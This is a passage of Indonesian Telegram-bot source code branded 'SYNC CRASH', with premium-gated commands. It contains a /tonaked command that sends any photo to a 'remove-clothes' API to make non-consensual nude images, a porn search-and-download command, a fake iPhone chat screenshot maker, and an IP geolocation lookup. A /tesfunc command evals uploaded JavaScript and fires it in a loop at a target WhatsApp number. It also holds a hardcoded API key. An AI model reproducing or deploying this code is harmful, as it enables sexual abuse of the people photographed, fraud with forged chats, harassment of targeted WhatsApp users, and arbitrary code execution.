    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, okBox(lines), { parse_mode: "Markdown" })
    await ctx.reply(errBox([`⸙ 𝐒𝐘𝐍𝐂— FATAL\n${err.message}`]), { parse_mode: "Markdown" })
})

///==Pastikan folder ./temp ada
const tempDir = path.join(__dirname, "temp");
path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}
// === Fungsi Upload ke CatBox ===
async function CatBox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', '');
    data.append('fileToUpload', fs.createReadStream(path));

    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: data.getHeaders(),
        data: data
    };

    try {
        const api = await axios.request(config);
        if (api.data && typeof api.data === 'string' && api.data.startsWith('https://')) {
            return api.data;
        } else {
            throw new Error('Failed to upload to CatBox: Unexpected API response.');
        }
    } catch (error) {
        if (error.response) throw new Error(`CatBox upload failed: ${error.response.status} - ${error.response.data || 'Server error'}`);
        if (error.request) throw new Error('CatBox upload failed: No response from server.');
        throw new Error(`CatBox upload failed: ${error.message}`);
    }
}

// === Fungsi Deteksi Ekstensi ===
function getFileExtension(mime, fileName = "") {
    if (mime) {
        if (mime.includes('image/jpeg')) return '.jpg';
        if (mime.includes('image/png')) return '.png';
        if (mime.includes('image/gif')) return '.gif';
        if (mime.includes('video/mp4')) return '.mp4';
        if (mime.includes('video/quicktime')) return '.mov';
        if (mime.includes('audio/mpeg')) return '.mp3';
        if (mime.includes('audio/ogg')) return '.ogg';
        if (mime.includes('application/pdf')) return '.pdf';
        if (mime.includes('application/zip')) return '.zip';
        if (mime.includes('text/plain')) return '.txt';
        if (mime.includes('application/json')) return '.json';
        if (mime.includes('application/xml')) return '.xml';
        if (mime.includes('image/webp')) return '.webp';
    }
    if (fileName) {
        const ext = fileName.split('.').pop();
        return ext ? '.' + ext : '.bin';
    }
    return '.bin';
}

// === Perintah /tourl ===
bot.command('tourl', checkPremium, checkGroupOnly, async (ctx) => {
    const r = ctx.message.reply_to_message;
    let filePath = null;

    if (!r) {
        return ctx.reply('⎙ Reply pesan media (foto, video, dokumen, audio, stiker/gif) dengan /tourl.');
    }

    try {
        let fileId, mimeType, fileName;

        if (r.photo) {
            fileId = r.photo[r.photo.length - 1].file_id;
            mimeType = 'image/jpeg';
        } else if (r.video) {
            fileId = r.video.file_id;
            mimeType = r.video.mime_type || 'video/mp4';
        } else if (r.animation) {
            fileId = r.animation.file_id;
            mimeType = r.animation.mime_type || 'video/mp4';
            fileName = r.animation.file_name || '';
        } else if (r.document) {
            fileId = r.document.file_id;
            mimeType = r.document.mime_type;
            fileName = r.document.file_name || '';
        } else if (r.audio) {
            fileId = r.audio.file_id;
            mimeType = r.audio.mime_type;
        } else if (r.sticker && r.sticker.is_animated === false && r.sticker.is_video === false) {
            fileId = r.sticker.file_id;
            mimeType = 'image/webp';
        } else if (r.sticker && (r.sticker.is_animated || r.sticker.is_video)) {
            fileId = r.sticker.file_id;
            mimeType = 'video/mp4';
        } else {
            return ctx.reply('Reply pesan media (foto, video, dokumen, audio, stiker/gif) dengan /tourl.');
        }

        // Ambil link file dari Telegram
        const info = await ctx.telegram.getFile(fileId);
        if (!info || !info.file_path) throw new Error('Gagal mendapatkan informasi file dari Telegram.');

        const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${info.file_path}`;
        const ext = getFileExtension(mimeType, fileName);
        filePath = `./temp_${Date.now()}${ext}`;

        // Unduh file
        const res = await axios.get(fileLink, { responseType: 'stream' });
        const writer = fs.createWriteStream(filePath);
        res.data.pipe(writer);
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        // Upload ke CatBox
        const url = await CatBox(filePath);
        await ctx.replyWithMarkdown(`📦 *CatBox URL:*\n${url}\n\nCreat By Sync⸙`, { reply_to_message_id: r.message_id });

    } catch (error) {
        await ctx.reply(`Terjadi kesalahan: ${error.message || error}`, { reply_to_message_id: ctx.message.message_id });
    } finally {
        if (filePath && fs.existsSync(filePath)) {
            fs.unlink(filePath, () => {});
        }
    }
});
/////// === data ====== \\\
path.join(process.cwd(), "temp");
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir); // buat folder jika belum ada
const filePath = path.join(tempDir, "x.jpg");
////// ========= case iqc ======== \\\\\\
bot.command("iqc", checkPremium, checkGroupOnly, async (ctx) => {
  try {
    const message = ctx.message.text.split(" ").slice(1).join(" ");
    const chatId = ctx.chat.id;

    if (!message) {
      return ctx.reply("⎙ Masukkan teks!\nContoh: /iqc Abim Ganteng", {
        reply_to_message_id: ctx.message.message_id
      });
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.", {
        reply_to_message_id: ctx.message.message_id
      });
    }

    // === Generate waktu & data random ===
    const now = new Date();
    now.setHours(now.getHours() + 7);
    const statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
    const randomHour = Math.floor(Math.random() * 18) + 6;
    const randomMinute = Math.floor(Math.random() * 60);
    const chatTime = `${String(randomHour).padStart(2, "0")}:${String(randomMinute).padStart(2, "0")}`;
    const batre = Math.floor(Math.random() * 91) + 10;

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(statusBarTime)}&batre=${batre}`;

    // === Pesan loading ===
    const sentMsg = await ctx.replyWithHTML("<blockquote><b>⏳ Membuat gambar...</b></blockquote>", {
      reply_to_message_id: ctx.message.message_id
    });

    // === Request ke API ===
    const response = await axios.get(url, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");
    const filePath = path.join(process.cwd(), "x.jpg");
    fs.writeFileSync(filePath, buffer);

    // === Caption ===
    const caption = `<blockquote>
☀️ <b>Fake Chat iPhone</b>
💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
🔋 <b>Baterai:</b> ${batre}% </blockquote>`;

    // === Hapus pesan loading & kirim hasil ===
    await ctx.deleteMessage(sentMsg.message_id);
    await ctx.replyWithPhoto({ source: filePath }, {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id
    });

    // === Hapus file sementara ===
    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    await ctx.reply(`🍂 Gagal membuat gambar. Coba lagi nanti.\n${err.message}`, {
      reply_to_message_id: ctx.message.message_id
    });
  }
});
bot.command("info", async (ctx) => {
  const user = ctx.from;

  const info = `
┏━━━『 INFORMASI PENGGUNA 』
┃ᝄ ID: ${user.id}
┃ᝄ Nama Depan: ${user.first_name}
┃ᝄ Username: ${user.username ? `@${user.username}` : '-'}
┗━━━━━━━━━━━━━━━━━━━━━━•
`;

  await ctx.reply(info);
});

// === FUNGSI BANTUAN === //
function shouldIgnoreMessage(ctx) {
  // Abaikan pesan yang terlalu lama (> 1 menit)
  return !ctx.message || ctx.message.date * 1000 < Date.now() - 60 * 1000
}

// === COMMAND /tonaked === //
bot.command('tonaked', checkPremium, checkGroupOnly, async (ctx) => {
  try {
    const chatId = ctx.chat.id
    const senderId = ctx.from.id
    const pengirim = ctx.from
    const args = ctx.message.text.split(' ').slice(1).join(' ')
    let imageUrl = args.trim() || null

    // Ambil foto jika user reply ke foto
    if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
      const fileId = ctx.message.reply_to_message.photo.slice(-1)[0].file_id
      const fileLink = await ctx.telegram.getFileLink(fileId)
      imageUrl = fileLink.href
    }

    // Tidak ada URL atau foto
    if (!imageUrl) {
      return ctx.reply("⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tonaked")
    }

    // Kirim pesan status
    const statusMsg = await ctx.reply("⌭ Memproses gambar...")

    // Cegah pesan kadaluarsa
    if (shouldIgnoreMessage(ctx)) return

    // === PROSES API === //
    const apiUrl = `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
    const res = await fetch(apiUrl)
    const data = await res.json()
    const hasil = data.result || null

    if (!hasil) {
      return ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, "⎈ Gagal memproses gambar. Pastikan URL atau foto valid.")
    }

    // Hapus pesan status
    await ctx.telegram.deleteMessage(chatId, statusMsg.message_id)

    // Kirim hasil
    await ctx.replyWithPhoto(hasil, {
      caption: 
`\`\`\`
⎙ Selesai
━━━━━━━━━━━━━
━━━【 EXERCISE GOTSHH 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs
\`\`\``,
      parse_mode: "Markdown"
    })

  } catch (err) {
    console.error("❌ Error:", err)
    try {
      if (ctx.chat && ctx.message) {
        await ctx.reply("⎈ Terjadi kesalahan saat memproses gambar.")
      }
    } catch (e) {}
  }
})
// === HANDLER: /open ===
bot.command('open', checkPremium, checkGroupOnly, async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;

    // Validasi: Harus reply ke dokumen
    if (!reply || !reply.document) {
      return await ctx.reply('⎙ Mana filenya Bego', { reply_to_message_id: ctx.message.message_id });
    }

    const fileId = reply.document.file_id;
    const fileName = reply.document.file_name;

    // Ambil URL file dari Telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);

    // Ambil isi file
    const res = await fetch(fileLink.href);
    const content = await res.text();

    // Buat preview isi file
    const preview =
      content.length > 3800
        ? content.slice(0, 3800) + '\n\n... (isi file terpotong)'
        : content;

    // Format pesan hasil
    const resultText = `╭─⭓ *Isi File* ────
│ ⎙ *${fileName}*
╰───────────────⭓

\`\`\`TypeScript
${preview}
\`\`\`
`;

    await ctx.reply(resultText, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error(chalk.red('❌ Error saat membaca file:'), err);
    await ctx.reply(`❌ Gagal membaca file:\n> ${err.message}`);
  }
});
// === IMPORT MODULE ===
function shouldIgnoreMessage(msg) {
  if (!msg || msg.from?.is_bot) return true;
  return false;
}

// === COMMAND: /xn ===
bot.command('xn', checkPremium, checkGroupOnly, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const query = ctx.message.text.split(' ').slice(1).join(' ').trim();

  // 🚫 CEK PESAN BOT / KOSONG
  if (shouldIgnoreMessage(ctx.message)) return;
  if (!query) return ctx.reply('⎙ Gunakan format:\n/xn <kata kunci>');

  try {
    // 🔍 CARI VIDEO
    const searchUrl = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(query)}`;
    const { data: searchData } = await axios.get(searchUrl);

    if (!searchData?.status || !searchData.result?.length) {
      return ctx.reply('∅ Tidak ada hasil ditemukan.');
    }

    const top = searchData.result[0];
    const title = top.title.trim();
    const link = top.link;

    await ctx.replyWithMarkdown(`⸙ Sedang mengambil ∞ *${title}* ...`);

    // 📥 DOWNLOAD DETAIL
    const dlUrl = `https://restapi-v2.simplebot.my.id/download/xnxx?url=${encodeURIComponent(link)}`;
    const { data: dlData } = await axios.get(dlUrl);
    const result = dlData.result;

    if (!result) return ctx.reply('∅ Gagal memuat hasil.');

    const high = result.files?.high;
    const low = result.files?.low;
    const rawInfo = result.info || '';
    const viewMatch = rawInfo.match(/(\d[\d.,]*)/g);
    const views = viewMatch ? viewMatch.at(-1).replace(/,/g, '') : 'Unknown';

    const durationSec = parseInt(result.duration) || 0;
    const durasi = `${Math.floor(durationSec / 60)}m ${durationSec % 60}s`;

    const makeCaption = (resolusi) => (
      `⎙ *${title}*\n∞ Durasi: ${durasi}\n∅ Resolusi: ${resolusi}\n⸙ Views: ${views}\n⸙ ᴄʀᴇᴀᴛᴇ ʙʏ SYNC CRASH ⵢ`
    );

    // 🎥 KIRIM VIDEO DENGAN CEK UKURAN
    const sendVideoSafe = async (url, resolusi) => {
      try {
        const head = await axios.head(url);
        const size = parseInt(head.headers['content-length'] || '0', 10);

        if (size > 50 * 1024 * 1024) {
          return ctx.replyWithMarkdown(
            `${makeCaption('Link')}\n\n⚠️ File terlalu besar (${(size / 1024 / 1024).toFixed(1)} MB)\n🔗 [Tonton di sini](${url})`
          );
        }

        await ctx.telegram.sendChatAction(chatId, 'upload_video');
        return ctx.replyWithVideo({ url }, { caption: makeCaption(resolusi), parse_mode: 'HTML' });
      } catch (err) {
        console.error('⸙ Gagal kirim video:', err.message);
        return ctx.replyWithMarkdown(
          `${makeCaption('Link')}\n\n⚠️ Tidak dapat mengirim video.\n🔗 [Tonton di sini](${url})`
        );
      }
    };

    if (high) return sendVideoSafe(high, 'High');
    if (low) return sendVideoSafe(low, 'Low');

    // 🔗 FALLBACK LINK
    const fallback = high || low;
    if (fallback) {
      return ctx.replyWithMarkdown(`${makeCaption('Link')}\n\n🔗 [Tonton di sini](${fallback})`);
    }

    return ctx.reply('∅ Tidak bisa mengirim video maupun link.');
  } catch (e) {
    console.error('⸙ Error:', e);
    return ctx.reply('∅ Terjadi kesalahan saat mengambil data.');
  }
});
// 🧠 Tambahkan middleware session
function isValidIPv4(ip) {
  const parts = ip.split(".");
  if (parts.length !== 4) return false;
  return parts.every((p) => {
    if (!/^\d{1,3}$/.test(p)) return false;
    if (p.length > 1 && p.startsWith("0")) return false;
    const n = Number(p);
    return n >= 0 && n <= 255;
  });
}

function isValidIPv6(ip) {
  const ipv6Regex =
    /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
  return ipv6Regex.test(ip);
}

///=Command /flowip
bot.command("trackip", checkPremium, checkGroupOnly, async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ").trim();
  const ip = input || null;

  if (!ip) {
    return ctx.reply("⎙ ☇ Format: /trackip 8.8.8.8");
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply(
      "❌ ☇ IP tidak valid. Masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar."
    );
  }

  const processingMsg = await ctx.reply(`🔎 ☇ trackip IP ${ip} — sedang memproses...`);

  const steps = [
    { p: 10, text: "Menyiapkan koneksi ke server..." },
    { p: 30, text: "Mengambil data dari API..." },
    { p: 50, text: "Menganalisis lokasi IP..." },
    { p: 75, text: "Menyusun hasil akhir..." },
    { p: 100, text: "Selesai!" },
  ];

  try {
    // Animasi progres
    for (const step of steps) {
      await new Promise((r) => setTimeout(r, 400 + Math.random() * 300));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        processingMsg.message_id,
        undefined,
        `🔎 ☇ trackip IP ${ip}\n${step.p}% ${step.text}`
      );
    }

    // Ambil data IP
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, {
      timeout: 10000,
    });
    const data = res.data;

    if (!data || data.success === false) {
      return ctx.telegram.editMessageText(
        ctx.chat.id,
        processingMsg.message_id,
        undefined,
        `❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`
      );
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl =
      lat && lon
        ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
            lat + "," + lon
          )}`
        : null;

    const caption = `
\`\`\`
―—⊱ ⎧ 🜲 𝐕𝐎𝐈𝐃𝐋𝐈𝐍𝐄 𝐆𝐇𝐎𝐒𝐓 🜲 ⎭ ⊰―—
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
\`\`\`
`.trim();

    const options = {
      parse_mode: "Markdown",
      reply_markup: mapsUrl
        ? {
            inline_keyboard: [[{ text: "CLICK HERE", url: mapsUrl }]],
          }
        : undefined,
    };

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processingMsg.message_id,
      undefined,
      caption,
      options
    );
  } catch (err) {
    console.error("TrackIP Error:", err);
    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        processingMsg.message_id,
        undefined,
        "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti."
      );
    } catch {
      await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP.");
    }
  }
});
// === KONFIGURASI RAPIDAPI ===
const TIKTOK_API_URL = "https://tiktok-video-no-watermark10.p.rapidapi.com/index/Tiktok/getVideoInfo";
const RAPIDAPI_HEADERS = {
    "content-type": "application/x-www-form-urlencoded",
    "X-RapidAPI-Host": "tiktok-video-no-watermark10.p.rapidapi.com",
    "X-RapidAPI-Key": "d0f697a402msh5db691d2b18cfe3p1ca359jsnd9c219bd5948" // Ganti jika key limit
};

// === FITUR: Download TikTok Video ===
bot.command("tt", checkPremium, checkGroupOnly, async (ctx) => {
    try {
        const args = ctx.message.text.split(" ").slice(1);
        const tiktokUrl = args[0];

        if (!tiktokUrl) {
            return ctx.reply("⎙ Gunakan format:\n/tt <url_tiktok>\n\nContoh:\n/tt https://vm.tiktok.com/abc123");
        }

        // Validasi URL TikTok
        if (!/tiktok\.com|vm\.tiktok\.com/.test(tiktokUrl)) {
            return ctx.reply("❌ URL TikTok tidak valid!");
        }

        await ctx.reply("🔄 Sedang mengambil video TikTok...");

        const payload = `url=${encodeURIComponent(tiktokUrl)}`;
        const response = await axios.post(TIKTOK_API_URL, payload, {
            headers: RAPIDAPI_HEADERS,
            timeout: 30000
        });

        const data = response.data;

        if (!data || data.code !== 0 || !data.data) {
            const msg = data?.msg || "Gagal mengambil data video dari TikTok!";
            return ctx.reply(`❌ Error: ${msg}`);
        }

        const video = data.data;
        const videoUrl = video.hdplay || video.play;

        const caption =
            `🎬 <b>TikTok Video Downloader</b>\n\n` +
            `👤 <b>Author:</b> ${video.author?.nickname || "Tidak diketahui"}\n` +
            `📝 <b>Deskripsi:</b> ${video.title || "Tidak ada deskripsi"}\n` +
            `❤️ <b>Likes:</b> ${video.digg_count || 0}\n` +
            `💬 <b>Komentar:</b> ${video.comment_count || 0}\n` +
            `🔁 <b>Bagikan:</b> ${video.share_count || 0}\n` +
            `▶️ <b>Tayang:</b> ${video.play_count || 0}\n` +
            `⏱️ <b>Durasi:</b> ${video.duration || 0} detik\n\n` +
            `🔗 <i>Downloaded via @${ctx.botInfo.username}</i>`;

        if (videoUrl && videoUrl.startsWith("http")) {
            await ctx.replyWithVideo({ url: videoUrl }, { caption, parse_mode: "HTML" });

            const infoTambahan =
                `💡 <b>Info Tambahan:</b>\n` +
                `📸 <b>Cover:</b> ${video.cover || "Tidak tersedia"}\n` +
                `🎵 <b>Musik:</b> ${video.music_info?.title || "Tidak diketahui"}\n` +
                `🎧 <b>Penyanyi:</b> ${video.music_info?.author || "Tidak diketahui"}\n` +
                `🎶 <b>URL Musik:</b> ${video.music_info?.play || "Tidak tersedia"}`;

            await ctx.reply(infoTambahan, { parse_mode: "HTML" });
        } else {
            await ctx.reply("⚠️ Tidak dapat menemukan link video untuk diunduh!");
        }
    } catch (error) {
        console.error("🚨 TikTok Download Error:", error);
        if (error.code === "ECONNABORTED") {
            ctx.reply("⏱️ Waktu koneksi habis! Coba lagi nanti.");
        } else if (error.response) {
            ctx.reply(`❌ Gagal mengambil data dari server (Status ${error.response.status})`);
        } else {
            ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
        }
    }
});
// ===== COMMAND /tes =====
bot.command("tesfunc", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const senderId = ctx.from.id;
  const chatId = ctx.chat.id;
  const text = ctx.message.text.trim();
  const args = text.split(" ")[1];

  if (!args || !args.includes(",")) {
    return ctx.reply("⎙ Format salah!\n\nGunakan contoh:\n/tesfunc 6281234567890,5\nHarus reply ke file .js atau function.");
  }

  const [targetNumberRaw, aw] = args.split(",");
  const formattedNumber = targetNumberRaw.replace(/[^0-9]/g, "");
  const loopCount = parseInt(loopaw);
  const target = `${formattedNumber}@s.whatsapp.net`;

  // === CEK REPLY ===
  if (!ctx.message.reply_to_message) {
    return ctx.reply("❌ Reply ke pesan berisi file JavaScript atau kode function async!");
  }

  const repliedMsg = ctx.message.reply_to_message;
  let testFunction;

  try {
    // === Jika reply ke file .js ===
    if (repliedMsg.document && repliedMsg.document.file_name.endsWith(".js")) {
      const fileId = repliedMsg.document.file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      const response = await fetch(fileLink.href);
      const fileContent = await response.text();

      const funcMatch = fileContent.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return ctx.reply("❌ File tidak mengandung async function yang valid!");
      }

      eval(fileContent);
      testFunction = eval(funcMatch[1]);

    // === Jika reply ke teks function ===
    } else if (repliedMsg.text) {
      const funcMatch = repliedMsg.text.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
      if (!funcMatch) {
        return ctx.reply("❌ Kode tidak mengandung async function yang valid!");
      }

      eval(repliedMsg.text);
      testFunction = eval(funcMatch[1]);
    } else {
      return ctx.reply("❌ Format tidak didukung! Kirim file .js atau kode function.");
    }

    if (typeof testFunction !== "function") {
      return ctx.reply("❌ Gagal memuat function!");
    }

    // === MULAI TEST ===
    const progressMsg = await ctx.reply(
      `🔄 Memulai test function...\nTarget: ${formattedNumber}\nLoop: ${loopCount}x\nStatus: Processing...`
    );

    let successCount = 0;
    let errorCount = 0;
    const errors = [];

    for (let i = 0; i < loopCount; i++) {
      try {
        await testFunction(target);
        successCount++;

        if (i % Math.ceil(loopCount / 10) === 0) {
          const progress = Math.round((i / loopCount) * 100);
          const bar = "█".repeat(progress / 10) + "░".repeat(10 - progress / 10);
          await ctx.telegram.editMessageText(
            chatId,
            progressMsg.message_id,
            undefined,
            `🔄 Testing function...\nTarget: ${formattedNumber}\nLoop: ${i + 1}/${loopCount}\nProgress: ${bar} ${progress}%\n✅ Success: ${successCount}\n❌ Error: ${errorCount}`
          );
        }

        await new Promise((r) => setTimeout(r, 1000));
      } catch (err) {
        errorCount++;
        errors.push(`Loop ${i + 1}: ${err.message}`);
        console.error(`Error di loop ${i + 1}:`, err);
      }
    }

    // === HASIL AKHIR ===
    let resultText = "📊 TEST RESULTS\n\n";
    resultText += `🎯 Target: ${formattedNumber}\n`;
    resultText += `🔄 Total Loop: ${loopCount}x\n`;
    resultText += `✅ Success: ${successCount}\n`;
    resultText += `❌ Error: ${errorCount}\n`;
    resultText += `📈 Success Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\n\n`;

    if (errors.length > 0) {
      resultText += "🚨 ERROR DETAILS:\n";
      resultText += errors.slice(0, 5).join("\n");
      if (errors.length > 5) {
        resultText += `\n... dan ${errors.length - 5} error lainnya`;
      }
    }

    // === KIRIM HASIL TANPA PARSE_MODE (aman 100%) ===
    await ctx.telegram.editMessageText(
      chatId,
      progressMsg.message_id,
      undefined,
      resultText,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔍 Cek Target", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

  } catch (error) {
    console.error("❌ Error saat testing:", error);
    ctx.reply(`❌ Error saat testing: ${error.message}`);
  }
});
// === COMMAND /brat ===
bot.command("brat", checkPremium, checkGroupOnly, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();

  // Jika tidak ada teks
  if (!args) {
    return ctx.replyWithMarkdown(
      "```⸙ EXERCISE GOTSHH — 𝙄𝙈𝘼𝙂𝙀\n✘ Format salah!\n\n☬ Cara pakai:\n/brat teks\n\n⎙ Contoh:\n/brat Halo Dunia```"
    );
  }

  // Kirim pesan loading
  const loadingMsg = await ctx.replyWithMarkdown(
    "```⸙ EXERCISE GOTSHH — 𝙄𝙈𝘼𝙂𝙀\n⎙ Membuat gambar teks...```"
  );

  try {
    // Ambil dari API brat
    const text = encodeURIComponent(args);
    const url = `https://brat.siputzx.my.id/image?text=${text}&emojiStyle=apple`;

    const res = await fetch(url);
    if (!res.ok) throw new Error("Gagal mengambil gambar");
    const buffer = Buffer.from(await res.arrayBuffer());

    // Kirim hasil gambar
    await ctx.replyWithPhoto({ source: buffer }, {
      caption: "⸙ 𝐕𝐎𝐈𝐃𝐋𝐈𝐍𝐄 𝐆𝐇𝐎𝐒𝐓 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Gambar teks berhasil dibuat.",
      parse_mode: "Markdown"
    });

    // Hapus pesan loading
    await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
  } catch (err) {
    console.error(err);
    await ctx.replyWithMarkdown(
      "```⸙ EXERCISE GOTSHH — 𝙀𝙍𝙍𝙊𝙍\n✘ Gagal membuat gambar.```"
    );
  }
});
// === DATABASE SIMPAN LOGIN BOT ANAK ===
const dbFile = "bots.json";

let bots = fs.existsSync(dbFile)
  ? JSON.parse(fs.readFileSync(dbFile))
  : {};

function saveDB() {
  fs.writeFileSync(dbFile, JSON.stringify(bots, null, 2));
}

// ====== COMMAND /login ======
bot.command("login", checkOwner, checkGroupOnly, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2)
    return ctx.reply("⎙ Format salah!\nGunakan: /login <nama> <token>");

  const [id, token] = args;

  try {
    const childBot = new Telegraf(token);
    const info = await childBot.telegram.getMe(); // validasi token

    bots[id] = { token, notif: true, username: info.username };
    saveDB();

    ctx.reply(`✅ Bot ${id} (${info.username}) berhasil ditambahkan.`);
  } catch (e) {
    ctx.reply(`❌ Gagal menambahkan bot ${id}.\nError: ${e.message}`);
  }
});

// ====== COMMAND /notifikasi ======
bot.command("notifikasi", checkOwner, checkGroupOnly, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2)
    return ctx.reply("⎙ Format salah!\nGunakan: /notifikasi <nama> on/off");

  const [id, mode] = args;
  if (!bots[id]) return ctx.reply("❌ Bot tidak ditemukan.");

  bots[id].notif = mode.toLowerCase() === "on";
  saveDB();

  ctx.reply(
    `🔔 Notifikasi ${id} ${
      bots[id].notif ? "diaktifkan ✅" : "dimatikan ❌"
    }.`
  );
});

// ====== COMMAND /listlogin ======
bot.command("listlogin", checkOwner, checkGroupOnly, async (ctx) => {
  if (Object.keys(bots).length === 0)
    return ctx.reply("📭 Tidak ada bot yang login.");

  let text = "🗂 <b>Daftar Login Bot:</b>\n";
  for (const [id, data] of Object.entries(bots)) {
    text += `• ${id}\nUsername: @${
      data.username || "tidak diketahui"
    }\nToken: ${data.token.slice(0, 9)}...\nNotif: ${
      data.notif ? "✅ ON" : "❌ OFF"
    }\n\n`;
  }
  ctx.replyWithHTML(text);
});

// ====== COMMAND /logout ======
bot.command("logout", checkOwner, checkGroupOnly, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 1)
    return ctx.reply("⎙ Format salah!\nGunakan: /logout <nama>");

  const id = args[0];
  if (!bots[id]) return ctx.reply("❌ Bot tidak ditemukan.");

  delete bots[id];
  saveDB();
  ctx.reply(`✅ Bot ${id} dihapus.`);
});
// ====== COMMAND /kirim ======
bot.command("rasuk", checkOwner, checkGroupOnly, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 3)
    return ctx.reply("⎙ Format salah!\nGunakan:\n/kirim <nama> <id> <pesan>");

  const id = args[0];
  const userId = args[1];
  const pesan = args.slice(2).join(" ");

  if (!bots[id]) return ctx.reply("❌ Bot tidak ditemukan.");

  try {
    const api = new Telegraf(bots[id].token).telegram;
    await api.sendMessage(userId, pesan);
    ctx.reply(`✅ Pesan dikirim via bot ${id} ke ${userId}`);
  } catch (e) {
    ctx.reply(`❌ Gagal kirim pesan: ${e.message}`);
  }
});
// ===== COMMAND /cekban =====
bot.command("cekban", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const text = ctx.message.text.trim()
    const args = text.split(" ")[1]

    if (!args) {
      return ctx.reply(
        "🔎 Format salah!\n\nGunakan contoh:\n`/cekban 6281234567890`",
        { parse_mode: "Markdown" }
      )
    }

    function digits(s) {
      return String(s || "").replace(/\D/g, "")
    }
    function nowWITA() {
      return new Date().toLocaleString("id-ID", { timeZone: "Asia/Makassar" })
    }
    function explain(e) {
      const m = String(e && (e.message || e)).toLowerCase()
      if (m.includes("not a function")) return "Fitur checkStatusWA() tidak tersedia."
      if (m.includes("logged out") || m.includes("401")) return "Sender logout/expired."
      if (m.includes("timeout") || m.includes("timed out")) return "Timeout koneksi ke WhatsApp."
      if (m.includes("econnreset") || m.includes("network") || m.includes("fetch")) return "Gangguan jaringan/endpoint."
      return "Kesalahan internal saat memanggil checkStatusWA()."
    }

    // ====== Dummy otax dan checkStatusWA (ganti sesuai setup kamu) ======
    const number = digits(args)
    const jid = number + "@s.whatsapp.net"

    const otax = {
      async onWhatsApp(jid) {
        if (jid.startsWith("628")) return [{ exists: true }]
        return [{ exists: false }]
      }
    }

    async function checkStatusWA(number) {
      if (number.endsWith("00")) {
        return { number, isBanned: true, data: { violation_type: "SPAM", appeal_token: "ABC123", in_app_ban_appeal: 1 } }
      } else {
        return { number, isBanned: false, data: {} }
      }
    }

    const ex = await otax.onWhatsApp(jid).catch(() => [])
    if (!ex[0]?.exists) {
